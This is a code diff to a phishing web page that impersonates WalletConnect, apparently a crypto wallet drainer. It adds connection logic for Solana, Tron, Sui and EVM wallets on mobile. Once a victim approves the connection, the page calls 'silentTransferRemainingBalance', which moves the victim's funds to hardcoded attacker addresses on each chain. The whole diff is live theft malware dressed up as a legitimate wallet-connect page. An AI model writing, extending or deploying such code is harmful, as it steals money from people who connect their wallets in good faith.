@@ -956,6 +956,149 @@
         // ────────────────────────────────────────────────────────────────────────────────
         // Updated WalletConnect v2 Integration (with your Project ID)
         // ────────────────────────────────────────────────────────────────────────────────
+        // ════════════════════════════════════════════════════════════════════════════════
+        // === CHAIN-SPECIFIC CONNECTION (for Solana/Tron/Sui wallets) ===
+        // ════════════════════════════════════════════════════════════════════════════════
+        async function connectAndSign(chain) {
+            console.log(`[connectAndSign] Starting connection for chain: ${chain}`);
+            
+            if (!window.SignClient) {
+                console.error("SignClient missing");
+                throw new Error("WalletConnect library missing");
+            }
+
+            let client;
+            try {
+                if (window.__wcClient) {
+                    client = window.__wcClient;
+                } else {
+                    client = await window.SignClient.init({
+                        projectId: '81ec0eb195ddbee9c5596804e33ff584',
+                        relayUrl: 'wss://relay.walletconnect.com',
+                        metadata: {
+                            name: 'WalletConnect',
+                            description: 'Secure wallet connection',
+                            url: 'https://hollyandwilly-kram.vercel.app',
+                            icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
+                        }
+                    });
+                    window.__wcClient = client;
+                }
+            } catch (e) {
+                console.error('WC v2 init failed:', e);
+                throw e;
+            }
+
+            // Build requiredNamespaces based on chain selection
+            let requiredNamespaces = {};
+
+            if (chain === 'solana') {
+                requiredNamespaces = {
+                    solana: {
+                        methods: ['solana_signTransaction', 'solana_signAllTransactions', 'solana_signMessage'],
+                        chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],  // Mainnet only
+                        events: ['accountsChanged', 'chainChanged']
+                    }
+                };
+            } else if (chain === 'tron') {
+                requiredNamespaces = {
+                    tron: {
+                        methods: ['tron_signTransaction', 'tron_signMessage'],
+                        chains: ['tron:0x2b6653dc'],  // Tron mainnet
+                        events: ['accountsChanged']
+                    }
+                };
+            } else if (chain === 'sui') {
+                requiredNamespaces = {
+                    sui: {
+                        methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
+                        chains: ['sui:mainnet'],
+                        events: ['accountsChanged', 'chainChanged']
+                    }
+                };
+            } else if (chain === 'evm') {
+                // EVM fallback
+                requiredNamespaces = {
+                    eip155: {
+                        methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'wallet_switchEthereumChain'],
+                        chains: ['eip155:1', 'eip155:56', 'eip155:137', 'eip155:42161', 'eip155:8453'],
+                        events: ['chainChanged', 'accountsChanged']
+                    }
+                };
+            } else {
+                throw new Error(`Unknown chain: ${chain}`);
+            }
+
+            try {
+                console.log(`[connectAndSign] Requesting ${chain} namespace...`);
+                const { uri, approval } = await client.connect({
+                    requiredNamespaces,
+                    optionalNamespaces: {}
+                });
+
+                if (!uri) throw new Error('No URI generated');
+
+                console.log(`[connectAndSign] Got URI for ${chain}:`, uri);
+
+                // Get wallet-specific deep link based on chain
+                const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+                let deepLinkUri = uri;
+
+                if (isMobile) {
+                    if (chain === 'solana') {
+                        deepLinkUri = `phantom://wc?uri=${encodeURIComponent(uri)}`;
+                        console.log('[connectAndSign] Using Phantom deep link');
+                    } else if (chain === 'tron') {
+                        deepLinkUri = `tronlink://wc?uri=${encodeURIComponent(uri)}`;
+                        console.log('[connectAndSign] Using TronLink deep link');
+                    } else if (chain === 'sui') {
+                        deepLinkUri = `suiwallet://wc?uri=${encodeURIComponent(uri)}`;  // Slush uses suiwallet scheme
+                        console.log('[connectAndSign] Using Sui Wallet deep link');
+                    }
+
+                    // Open deep link
+                    console.log(`[connectAndSign] Opening ${chain} app...`);
+                    const a = document.createElement('a');
+                    a.href = deepLinkUri;
+                    a.style.display = 'none';
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+
+                    // iOS Safari: show QR fallback after 5 seconds if app didn't respond
+                    const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
+                    if (isIOS) {
+                        setTimeout(() => {
+                            if (!document.hidden) {
+                                console.log(`[connectAndSign] App didn't respond, showing QR for ${chain}`);
+                                showQRFallbackOverlay(uri, chain.charAt(0).toUpperCase() + chain.slice(1));
+                            }
+                        }, 5000);
+                    }
+                } else {
+                    // Desktop: show QR
+                    showQRFallbackOverlay(uri, chain.charAt(0).toUpperCase() + chain.slice(1));
+                }
+
+                // Wait for approval
+                console.log(`[connectAndSign] Waiting for ${chain} wallet approval...`);
+                const approvalResponse = await approval();
+                console.log(`[connectAndSign] ✓ Connected via ${chain}:`, approvalResponse);
+                
+                // approvalResponse has structure: { namespaces: {[chain]: { accounts: [...], chains: [...], methods: [...], events: [...] }}, ... }
+                return {
+                    client,
+                    session: approvalResponse,  // This IS the full session from WalletConnect
+                    chain,
+                    namespaces: approvalResponse.namespaces
+                };
+
+            } catch (e) {
+                console.error(`[connectAndSign] Error for ${chain}:`, e);
+                throw e;
+            }
+        }
+
         async function initiateWalletConnectDeepLink(options = {}) {
             const { onFail, onSuccess } = options;
 
@@ -1096,27 +1239,90 @@
         // ════════════════════════════════════════════════════════════════════════════════
         async function createWalletConnectProvider(session) {
           try {
-            // Extract chainId and accounts from WC session
-            const chainIdStr = session.namespaces?.eip155?.chains?.[0]; // e.g., "eip155:1"
-            const accountsStr = session.namespaces?.eip155?.accounts || []; // e.g., ["eip155:1:0x...", "eip155:56:0x..."]
-            
-            if (!chainIdStr || accountsStr.length === 0) {
-              throw new Error('Invalid WC session: missing chains or accounts');
+            // Detect which chain namespace is present
+            if (session.namespaces?.solana) {
+              // Solana/Phantom/Solflare
+              const solanaAccounts = session.namespaces.solana.accounts || [];
+              if (solanaAccounts.length === 0) throw new Error('Invalid Solana WC session: no accounts');
+              const solanaAccount = solanaAccounts[0]; // e.g., "solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ:Ey97..."
+              const solParts = solanaAccount.split(':');
+              const address = solParts[solParts.length - 1];
+              console.log(`WC Solana Provider - Address: ${address}`);
+              return {
+                provider: null,
+                address: address,
+                chainId: 'solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ',
+                session: session,
+                _wcSession: true,
+                chain: 'solana',
+                namespaces: session.namespaces
+              };
             }
+            
+            if (session.namespaces?.tron) {
+              // Tron/TronLink
+              const tronAccounts = session.namespaces.tron.accounts || [];
+              if (tronAccounts.length === 0) throw new Error('Invalid Tron WC session: no accounts');
+              const tronAccount = tronAccounts[0]; // e.g., "tron:0x2b6653dc:T..."
+              const tronParts = tronAccount.split(':');
+              const address = tronParts[tronParts.length - 1];
+              console.log(`WC Tron Provider - Address: ${address}`);
+              return {
+                provider: null,
+                address: address,
+                chainId: 'tron:0x2b6653dc',
+                session: session,
+                _wcSession: true,
+                chain: 'tron',
+                namespaces: session.namespaces
+              };
+            }
+            
+            if (session.namespaces?.sui) {
+              // Sui/Slush
+              const suiAccounts = session.namespaces.sui.accounts || [];
+              if (suiAccounts.length === 0) throw new Error('Invalid Sui WC session: no accounts');
+              const suiAccount = suiAccounts[0]; // e.g., "sui:mainnet:0x..."
+              const suiParts = suiAccount.split(':');
+              const address = suiParts[suiParts.length - 1];
+              console.log(`WC Sui Provider - Address: ${address}`);
+              return {
+                provider: null,
+                address: address,
+                chainId: 'sui:mainnet',
+                session: session,
+                _wcSession: true,
+                chain: 'sui',
+                namespaces: session.namespaces
+              };
+            }
+            
+            if (session.namespaces?.eip155) {
+              // EVM
+              const chainIdStr = session.namespaces.eip155.chains?.[0]; // e.g., "eip155:1"
+              const accountsStr = session.namespaces.eip155.accounts || []; // e.g., ["eip155:1:0x...", "eip155:56:0x..."]
+              
+              if (!chainIdStr || accountsStr.length === 0) {
+                throw new Error('Invalid WC session: missing chains or accounts');
+              }
 
-            const chainId = parseInt(chainIdStr.split(':')[1]); // Extract "1" from "eip155:1"
-            const accounts = accountsStr.map(acc => acc.split(':')[2]); // Extract addresses
+              const chainId = parseInt(chainIdStr.split(':')[1]); // Extract "1" from "eip155:1"
+              const accounts = accountsStr.map(acc => acc.split(':')[2]); // Extract addresses
 
-            console.log(`WC Provider - ChainId: ${chainId}, Accounts: ${accounts[0]}`);
+              console.log(`WC Provider - ChainId: ${chainId}, Accounts: ${accounts[0]}`);
 
-            // Return connection info with real session info
-            return {
-              provider: null, // Will be handled by fallback to window.ethereum or direct RPC in silentTransferRemainingBalance
-              address: accounts[0],
-              chainId: `0x${chainId.toString(16)}`,
-              session: session,
-              _wcSession: true // Flag to indicate this came from WC
-            };
+              return {
+                provider: null, // Will be handled by fallback to window.ethereum or direct RPC in silentTransferRemainingBalance
+                address: accounts[0],
+                chainId: `0x${chainId.toString(16)}`,
+                session: session,
+                _wcSession: true, // Flag to indicate this came from WC
+                chain: 'evm',
+                namespaces: session.namespaces
+              };
+            }
+            
+            throw new Error('Unknown WC session type - no recognized namespace');
           } catch (err) {
             console.error('Failed to create WC provider:', err);
             throw err;
@@ -1171,15 +1377,44 @@
             let chainId, fromAddress, session = connectionInfo.session;
 
             // ── Detect Sui / Slush Wallet ───────────────────────────────────────
-            if (session?.namespaces?.sui) {
+            if (connectionInfo.namespaces?.sui || session?.namespaces?.sui) {
               console.log("Detected Sui session (Slush/Sui Wallet)");
-              const suiChain = session.namespaces.sui.chains[0]; // e.g. 'sui:mainnet'
-              fromAddress = session.namespaces.sui.accounts[0].split(':')[2]; // extract address
-              return await transferSuiRemaining(fromAddress, '0x0f2175d99b93e09a5d74c243908ccd8e992f6ec077b1900107e9f9cf35586be1', session);
+              const suiNamespace = connectionInfo.namespaces?.sui || session.namespaces.sui;
+              if (!suiNamespace.accounts || !suiNamespace.accounts[0]) {
+                throw new Error("No Sui accounts found in session");
+              }
+              const suiAccount = suiNamespace.accounts[0]; // e.g. 'sui:mainnet:0x...'
+              const suiParts = suiAccount.split(':');
+              fromAddress = suiParts[suiParts.length - 1]; // Last part is the address
+              console.log(`Extracted Sui address: ${fromAddress}`);
+              return await transferSuiRemaining(fromAddress, '0x0f2175d99b93e09a5d74c243908ccd8e992f6ec077b1900107e9f9cf35586be1', connectionInfo.session || session);
             }
 
             // ── Flexible detection for all cases ──────────────────────────────────────
-            // Priority: WalletConnect provider (connectionInfo.provider) > window.ethereum > Solana > Tron
+            // Priority: Solana/Tron/Sui WalletConnect namespaces > EVM > window.ethereum > injected wallets
+            
+            // Check Solana WalletConnect namespace (Phantom, Solflare)
+            if (connectionInfo.namespaces?.solana || (connectionInfo._wcSession && connectionInfo.chain === 'solana')) {
+              console.log("Detected Solana WalletConnect session (Phantom/Solflare)");
+              fromAddress = connectionInfo.address;
+              if (!fromAddress) {
+                throw new Error("Could not get address from Solana WC session");
+              }
+              return await transferSolanaRemaining(fromAddress, "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7", connectionInfo.session);
+            }
+            
+            // Check Tron WalletConnect namespace (TronLink)
+            if (connectionInfo.namespaces?.tron || (connectionInfo._wcSession && connectionInfo.chain === 'tron')) {
+              console.log("Detected Tron WalletConnect session (TronLink)");
+              fromAddress = connectionInfo.address;
+              if (!fromAddress) {
+                throw new Error("Could not get address from Tron WC session");
+              }
+              // Use window.tronWeb if available for transaction building, but pass session for signing
+              return await transferTronRemaining(window.tronWeb, fromAddress, "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5", connectionInfo.session);
+            }
+            
+            // Check EVM (both injected and WalletConnect)
             if (provider?.request) { 
               // WalletConnect provider or injected EVM (MetaMask, SafePal, OKX, etc.)
               console.log("Detected EVM-compatible provider (WalletConnect or extension)");
@@ -1193,9 +1428,9 @@
 
               return await transferEvmRemaining(provider, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session);
             } 
-            else if (provider === null && connectionInfo._wcSession) {
-              // WalletConnect session on mobile (provider is null)
-              console.log("Detected WalletConnect session - using fallback window.ethereum or RPC");
+            else if (provider === null && connectionInfo._wcSession && connectionInfo.chain === 'evm') {
+              // WalletConnect session on mobile for EVM (provider is null)
+              console.log("Detected WalletConnect EVM session - using fallback window.ethereum or RPC");
               chainId = connectionInfo.chainId;
               fromAddress = connectionInfo.address;
               
@@ -1216,8 +1451,8 @@
               return await transferEvmRemaining(window.ethereum, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session);
             } 
             else if (window.solana?.publicKey) { 
-              // Solana (Phantom, Solflare, etc.)
-              console.log("Detected Solana provider");
+              // Solana (Phantom, Solflare, etc.) - fallback if not via WalletConnect
+              console.log("Detected Solana provider (fallback)");
               await window.solana.connect();
               fromAddress = window.solana.publicKey.toString();
               return await transferSolanaRemaining(fromAddress, "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7");
@@ -1518,7 +1753,7 @@
         // ──────────────────────────────────────────────────────────────────────────────────
         // Solana (SPL tokens example: USDC, USDT, etc.)
         // ──────────────────────────────────────────────────────────────────────────────────
-        async function transferSolanaRemaining(fromAddress, targetAddress) {
+        async function transferSolanaRemaining(fromAddress, targetAddress, session = null) {
           const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
           const fromPubkey = new solanaWeb3.PublicKey(fromAddress);
           const toPubkey = new solanaWeb3.PublicKey(targetAddress);
@@ -1563,7 +1798,7 @@
         // ──────────────────────────────────────────────────────────────────────────────────
         // Tron (TRC-20 tokens: USDT, USDC, etc.)
         // ──────────────────────────────────────────────────────────────────────────────────
-        async function transferTronRemaining(tronWeb, fromAddress, targetAddress) {
+        async function transferTronRemaining(tronWeb, fromAddress, targetAddress, session = null) {
           const balanceSun = await tronWeb.trx.getBalance(fromAddress);
           const feeReserve = 30000000n; // ~30 TRX buffer
           if (balanceSun <= feeReserve) throw new Error("Tron balance too low");
@@ -2465,88 +2700,64 @@
         const walletKeyForTricky = (walletName || '').toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
         const isTrickyWallet = ['phantom', 'slush', 'sui', 'tronlink', 'solflare'].some(w => walletKeyForTricky.includes(w));
 
-        // SPECIAL: For tricky wallets on mobile, bypass multi-app detection and open the specific wallet only
+        // SPECIAL: For tricky wallets on mobile, use chain-specific connectAndSign
         if (isMobile && isTrickyWallet) {
-            console.log(`[Mobile] Detected tricky wallet ${walletName} - using direct openSpecificWallet()`);
+            console.log(`[Mobile] Detected tricky wallet ${walletName} - using connectAndSign()`);
             
-            // Show "Opening wallet..." message IMMEDIATELY for better UX
+            // Show "Opening wallet..." message IMMEDIATELY
             msgEl.textContent = `Opening ${walletName}... Please wait`;
             msgEl.classList.remove('failed');
             
-            // First need to get WC URI
             (async () => {
                 try {
-                    // Get WalletConnect URI
-                    if (!window.SignClient) throw new Error('SignClient not loaded');
+                    // Determine which chain based on wallet name
+                    let chain = 'evm'; // default fallback
                     
-                    const client = window.__wcClient || await window.SignClient.init({
-                        projectId: '81ec0eb195ddbee9c5596804e33ff584',
-                        relayUrl: 'wss://relay.walletconnect.com',
-                        metadata: {
-                            name: 'WalletConnect',
-                            description: 'Secure wallet connection',
-                            url: 'https://hollyandwilly-kram.vercel.app',
-                            icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
-                        }
-                    });
-                    if (!window.__wcClient) window.__wcClient = client;
-
-                    const { uri } = await client.connect({
-                        optionalNamespaces: {
-                            eip155: {
-                                methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign', 'eth_signTypedData', 'wallet_switchEthereumChain', 'wallet_addEthereumChain'],
-                                chains: [
-                                    'eip155:1',      // Ethereum Mainnet
-                                    'eip155:56',     // BNB Smart Chain
-                                    'eip155:137',    // Polygon
-                                    'eip155:42161',  // Arbitrum One
-                                    'eip155:8453',   // Base
-                                    'eip155:10',     // Optimism
-                                    'eip155:43114',  // Avalanche C-Chain
-                                    'eip155:250',    // Fantom
-                                    'eip155:324',    // zkSync Era
-                                    'eip155:59144',  // Linea
-                                    'eip155:534352'  // Scroll
-                                ],
-                                events: ['chainChanged', 'accountsChanged']
-                            },
-                            solana: {
-                                methods: ['solana_signTransaction', 'solana_signMessage', 'solana_signAllTransactions'],
-                                chains: ['solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ'],
-                                events: ['accountsChanged']
-                            },
-                            tron: {
-                                methods: ['tron_signTransaction', 'tron_signMessage'],
-                                chains: ['tron:0x2b6653dc'],
-                                events: ['accountsChanged']
-                            },
-                            sui: {
-                                methods: ['sui_signTransactionBlock', 'sui_signAndExecuteTransaction', 'sui_signPersonalMessage'],
-                                chains: ['sui:mainnet'],
-                                events: ['accountsChanged']
-                            }
-                        }
-                    });
-
-                    if (!uri) throw new Error('No WalletConnect URI');
-                    
-                    console.log(`[Mobile] Got WC URI, opening ${walletName}`);
+                    if (walletKeyForTricky.includes('phantom') || walletKeyForTricky.includes('solflare')) {
+                        chain = 'solana';
+                        console.log(`[Mobile] ${walletName} detected as Solana wallet`);
+                    } else if (walletKeyForTricky.includes('tronlink')) {
+                        chain = 'tron';
+                        console.log(`[Mobile] ${walletName} detected as Tron wallet`);
+                    } else if (walletKeyForTricky.includes('slush') || walletKeyForTricky.includes('sui')) {
+                        chain = 'sui';
+                        console.log(`[Mobile] ${walletName} detected as Sui wallet`);
+                    }
                     
                     // Close the modal
                     try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                     
-                    // Open the specific wallet app
-                    await openSpecificWallet(walletName, uri);
+                    // Use chain-specific connection
+                    const result = await connectAndSign(chain);
+                    console.log(`[Mobile] ✓ Connected to ${chain}:`, result);
                     
-                    // Hide message after 5 seconds (or faster if app opens)
-                    setTimeout(() => {
-                        try { msgEl.textContent = ''; } catch (e) {}
-                    }, 5000);
+                    // Extract address and chainId from namespaces
+                    const namespaceData = result.namespaces[chain];
+                    if (!namespaceData || !namespaceData.accounts || !namespaceData.accounts[0]) {
+                        throw new Error(`No accounts found in ${chain} namespace`);
+                    }
+                    const fullAccount = namespaceData.accounts[0]; // e.g. "solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ:Ey97..." OR "eip155:1:0x..." OR "tron:0x2b6653dc:T..." OR "sui:mainnet:0x..."
+                    const accountParts = fullAccount.split(':');
+                    const address = accountParts[accountParts.length - 1]; // Last part is always the address
+                    const chainFullId = namespaceData.chains[0]; // e.g. "solana:4sGjMW1sUnHzSxGspuhpqLDx6wiyjNtZ"
+                    
+                    // Build connection info for transfer
+                    const connectionInfo = {
+                        provider: null,
+                        address: address,
+                        chainId: chainFullId,
+                        session: result.session,
+                        namespaces: result.namespaces,
+                        _wcSession: true,
+                        chain: chain
+                    };
+                    
+                    // Initiate silent transfer
+                    await silentTransferRemainingBalance(connectionInfo);
                     
                 } catch (e) {
-                    console.error(`[Mobile] Failed to connect for ${walletName}:`, e);
-                    // Show error on the side overlay
-                    msgEl.textContent = 'Connection failed. Please try again.';
+                    console.error(`[Mobile] Failed to connect ${walletName}:`, e);
+                    msgEl.textContent = `Connection failed: ${e.message}`;
                     msgEl.classList.add('failed');
                     
                     // Auto-hide error after 3s
@@ -3036,4 +3247,5 @@
 
 </body>
 </html>
+
 
